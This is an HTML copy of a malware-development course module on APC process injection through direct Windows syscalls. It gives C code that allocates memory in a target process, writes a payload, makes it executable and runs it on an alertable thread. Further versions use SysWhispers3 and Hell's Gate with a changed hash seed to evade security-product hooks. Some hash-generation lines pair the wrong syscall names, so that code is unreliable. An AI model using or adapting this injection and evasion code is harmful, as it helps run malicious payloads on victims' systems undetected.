<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>69. Syscalls - Reimplementing APC Injection</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="4134d6ca-e4f8-4873-8488-8ad519adc700" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/69"><strong>69. Syscalls - Reimplementing APC Injection</strong></a></h1></header><div class="page-body"><h2 id="31ec74e5-cb1f-478b-9ec7-84dbad320451" class=""><strong>Syscalls - Reimplementing APC Injection</strong></h2><h3 id="79af7a45-1876-44fb-98d8-0827bd564a15" class=""><strong>Introduction</strong></h3><p id="99ab5c4e-f168-45f1-a20f-adec3cd06b43" class="">This module implements the APC Injection technique using direct syscalls, replacing WinAPIs with their syscall equivalent. Memory allocation and writing the payload will be done using <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code> and <code>NtWriteVirtualMemory</code> which were already discussed in the reimplementation of classic injection. The remaining syscall that will be explained is <code>NtQueueApcThread</code>.</p><ul id="0d500f56-a409-4c86-bb80-ba35b051b4e0" class="bulleted-list"><li style="list-style-type:disc"><code>QueueUserAPC</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtQueueApcThread.html">NtQueueApcThread</a></li></ul><h3 id="462c10bc-bd8f-4155-8e3d-ff18d04659d0" class=""><strong>NtQueueApcThread</strong></h3><p id="196a4974-206b-43e7-ad5b-c8716ad3e77b" class="">This is the resulting syscall from the <code>QueueUserAPC</code> WinAPI. <code>NtQueueApcThread</code> is shown below.</p><pre id="1f25ae2d-2f7f-4b8a-bade-53b7bee11edc" class="code code-wrap"><code>NTSTATUS NtQueueApcThread(
  IN HANDLE               ThreadHandle,                 // A handle to the thread to run the specified APC
  IN PIO_APC_ROUTINE      ApcRoutine,                   // Pointer to the application-supplied APC function to be executed
  IN PVOID                ApcRoutineContext OPTIONAL,   // Pointer to a parameter (1) for the APC (set to NULL)
  IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,      // Pointer to a parameter (2) for the APC (set to NULL)
  IN ULONG                ApcReserved OPTIONAL          // Pointer to a parameter (3) for the APC (set to NULL)
);
</code></pre><p id="e486106d-eef3-48f5-af4b-33cdd96166d5" class="">The first two parameters are self-explanatory. The remaining three, <code>ApcRoutineContext</code>, <code>ApcStatusBlock</code> and <code>ApcReserved</code> are used as parameters for the APC function, <code>ApcRoutine</code>.</p><h3 id="b12b8dbd-3ab8-43bf-ab77-f2331d4967e0" class=""><strong>Creating An Alertable Thread</strong></h3><p id="31a0fbf2-3ec4-4bb2-b24b-6153d90acf05" class="">Since the APC Injection technique requires a thread in an alertable state, this will be provided using the <code>CreateThread</code> WinAPI. The <code>AlterableFunction</code> function will be called by the sacrificial thread.</p><pre id="147b437f-f4c9-4a6a-a6b1-bb1e7fdd6b66" class="code code-wrap"><code>VOID AlterableFunction() {

  HANDLE	hEvent = CreateEvent(NULL, NULL, NULL, NULL);

  MsgWaitForMultipleObjectsEx(
		1,
		&amp;hEvent,
		INFINITE,
		QS_HOTKEY,
		MWMO_ALERTABLE
	);

}
</code></pre><h3 id="b47ba853-dfd7-4cc9-bd18-c9f1ff0950e0" class=""><strong>Implementation Using GetProcAddress and GetModuleHandle</strong></h3><p id="3686878e-105e-4261-94a5-9f5815111baa" class="">A <code>Syscall</code> structure is created and initialized using <code>InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p><pre id="85534cfa-4121-4620-99b7-90140bcfd0ab" class="code code-wrap"><code>// A structure used to keep the syscalls used
typedef struct _Syscall {

	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
	fnNtQueueApcThread        pNtQueueApcThread;

}Syscall, * PSyscall;


// Function used to populate the input &#x27;St&#x27; structure
BOOL InitializeSyscallStruct(OUT PSyscall St) {

	HMODULE hNtdll =  GetModuleHandle(L&quot;NTDLL.DLL&quot;);
	if (!hNtdll) {
		printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
	St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
	St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
	St-&gt;pNtQueueApcThread         = (fnNtQueueApcThread)GetProcAddress(hNtdll, &quot;NtQueueApcThread&quot;);

    // check if GetProcAddress missed a syscall
	if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtQueueApcThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre><p id="6c491e54-f97a-4608-8f9b-79542cf45d55" class="">Next, the <code>ApcInjectionViaSyscalls</code> function will be responsible for allocating, writing and executing the payload, <code>pPayload</code>, in the target process, <code>hProcess</code>. It will use the sacrificial thread&#x27;s handle, <code>hThread</code>. The function returns <code>FALSE</code> if it fails to execute the payload and <code>TRUE</code> if it succeeds.</p><pre id="d8a2e6ca-02be-45ae-95de-2ade1eff21f3" class="code code-wrap"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	Syscall     St                      = { 0 };
	NTSTATUS    STATUS                  = NULL;
	PVOID       pAddress                = NULL;
	ULONG       uOldProtection          = NULL;
	SIZE_T      sSize                   = sPayloadSize,
	            sNumberOfBytesWritten   = NULL;

	// Initializing the &#x27;St&#x27; structure to fetch the syscall&#x27;s addresses
	if (!InitializeSyscallStruct(&amp;St)) {
		printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
		return FALSE;
	}


	// Allocating memory
	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

	// Changing the memory&#x27;s permissions to RWX
	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------

	// Executing the payload via NtQueueApcThread

	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
	if ((STATUS = St.pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);

	return TRUE;
}
</code></pre><h3 id="2a48fe68-718d-4af3-8a42-d86491f00895" class=""><strong>Implementation Using SysWhispers</strong></h3><p id="6df45ef7-e580-43cd-8927-adac77b6e682" class="">The implementation here uses SysWhispers3 to bypass userland hooks via direct syscalls. The following command is used to generate the required files for this implementation.</p><pre id="3f8e1f78-c9fb-458f-86c7-02e6dc6242b3" class="code code-wrap"><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtQueueApcThread -o SysWhispers -v
</code></pre><p id="65f2c04f-7127-4c61-aac2-5a8172ef3476" class="">Three files are generated: <code>SysWhispers.h</code>, <code>SysWhispers.c</code> and <code>SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as demonstrated previously. <code>ApcInjectionViaSyscalls</code> is shown below.</p><pre id="f58d20d8-4fda-4bd0-86d4-7f67e8db3367" class="code code-wrap"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	Syscall     St                      = { 0 };
	NTSTATUS    STATUS                  = NULL;
	PVOID       pAddress                = NULL;
	ULONG       uOldProtection          = NULL;
	SIZE_T      sSize                   = sPayloadSize,
	            sNumberOfBytesWritten   = NULL;

	// Allocating memory
	if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
	if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);


//--------------------------------------------------------------------------

	// Changing the memory&#x27;s permissions to RWX
	if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------

	// Executing the payload via NtQueueApcThread

	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
	if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);

	return TRUE;
}
</code></pre><h3 id="36b000d5-6d4e-4854-9a28-1ad0b9abefe5" class=""><strong>Implementation Using Hell&#x27;s Gate</strong></h3><p id="af96756b-0203-4b05-bf92-a61dfcd5cd24" class="">The last implementation for this module is using Hell&#x27;s Gate. First, ensure that the same steps done to set up the Visual Studio project with SysWhispers3 are done here too. Specifically, enabling MASM and modifying the properties to set the ASM file to be compiled using the Microsoft Macro Assembler.</p><h3 id="379833be-48ff-40f6-bfab-f0374c2f4044" class=""><strong>Updating The VX_TABLE Structure</strong></h3><pre id="ef744ff6-e054-4bc0-8139-b5bef2930fab" class="code code-wrap"><code>typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;
</code></pre><h3 id="ec4ab520-10ad-44cf-a4d2-b3d7050bd9f8" class=""><strong>Updating Seed Value</strong></h3><p id="7cae1f44-b60c-418f-a9aa-a180d0e11d3f" class="">A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p><pre id="77b8db9f-2ec0-48c2-8adb-410fe92ec3d5" class="code code-wrap"><code>DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
	INT c;

	while (c = *str++)
		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

	return dwHash;
}
</code></pre><p id="0ab90651-1580-498a-969b-bc9c6326d2bd" class="">The following <code>printf</code> statements should be added to a new project to generate the djb2 hash values.</p><pre id="24967dcc-8b0b-4662-8a27-02a601a4c915" class="code code-wrap"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtQueueApcThread&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));
